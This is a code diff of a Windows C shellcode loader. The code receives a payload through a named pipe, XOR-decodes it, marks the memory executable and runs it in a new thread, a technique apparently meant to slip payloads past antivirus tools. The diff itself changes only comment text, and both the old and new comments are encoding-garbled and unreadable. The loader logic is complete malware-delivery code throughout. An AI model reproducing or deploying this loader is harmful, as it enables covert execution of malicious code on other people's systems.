@@ -10,9 +10,9 @@ BOOL RecvShellcode(VOID){
     HANDLE hPipeClient;
     DWORD dwWritten;
     DWORD dwShellcodeSize = sizeof(buf);
-    // µÈ´ı¹ÜµÀ¿ÉÓÃ
+    // ç­‰å¾…ç®¡é“å¯ç”¨
     WaitNamedPipe(ptsPipeName,NMPWAIT_WAIT_FOREVER);
-    // Á¬½Ó¹ÜµÀ
+    // è¿æ¥ç®¡é“
     hPipeClient = CreateFile(ptsPipeName,GENERIC_WRITE,FILE_SHARE_READ,NULL,OPEN_EXISTING ,FILE_ATTRIBUTE_NORMAL,NULL);
 
     if(hPipeClient == INVALID_HANDLE_VALUE){
@@ -38,10 +38,10 @@ int wmain(int argc, TCHAR * argv[]){
     CHAR szBuffer[BUFF_SIZE];
     DWORD dwLen;
     PCHAR pszShellcode = NULL;
-    DWORD dwOldProtect; // ÄÚ´æÒ³ÊôĞÔ
+    DWORD dwOldProtect; // å†…å­˜é¡µå±æ€§
     HANDLE hThread;
     DWORD dwThreadId;
-    // ²Î¿¼£ºhttps://docs.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-createnamedpipea
+    // å‚è€ƒï¼šhttps://docs.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-createnamedpipea
     hPipe = CreateNamedPipe(
         ptsPipeName,
         PIPE_ACCESS_INBOUND,
@@ -64,9 +64,9 @@ int wmain(int argc, TCHAR * argv[]){
         printf("[+]Client Connected...\n");
         ReadFile(hPipe,szBuffer,BUFF_SIZE,&dwLen,NULL);
         printf("[+]Get DATA Length : %d \n",dwLen);
-        // ÉêÇëÄÚ´æÒ³
+        // ç”³è¯·å†…å­˜é¡µ
         pszShellcode = (PCHAR)VirtualAlloc(NULL,dwLen,MEM_COMMIT,PAGE_READWRITE);
-        // ¿½±´ÄÚ´æ
+        // æ‹·è´å†…å­˜
         CopyMemory(pszShellcode,szBuffer,dwLen);
 
         for(DWORD i = 0;i< dwLen; i++){
@@ -74,16 +74,16 @@ int wmain(int argc, TCHAR * argv[]){
             _InterlockedXor8(pszShellcode+i,10);
         }
 
-        // ÕâÀï¿ªÊ¼¸ü¸ÄËüµÄÊôĞÔÎª¿ÉÖ´ĞĞ
+        // è¿™é‡Œå¼€å§‹æ›´æ”¹å®ƒçš„å±æ€§ä¸ºå¯æ‰§è¡Œ
         VirtualProtect(pszShellcode,dwLen,PAGE_EXECUTE,&dwOldProtect);
-        // Ö´ĞĞShellcode
+        // æ‰§è¡ŒShellcode
         hThread = CreateThread(
-            NULL, // °²È«ÃèÊö·û
-            NULL, // Õ»µÄ´óĞ¡
-            (LPTHREAD_START_ROUTINE)pszShellcode, // º¯Êı
-            NULL, // ²ÎÊı
-            NULL, // Ïß³Ì±êÖ¾
-            &dwThreadId // Ïß³ÌID
+            NULL, // å®‰å…¨æè¿°ç¬¦
+            NULL, // æ ˆçš„å¤§å°
+            (LPTHREAD_START_ROUTINE)pszShellcode, // å‡½æ•°
+            NULL, // å‚æ•°
+            NULL, // çº¿ç¨‹æ ‡å¿—
+            &dwThreadId // çº¿ç¨‹ID
         );
 
         WaitForSingleObject(hThread,INFINITE);
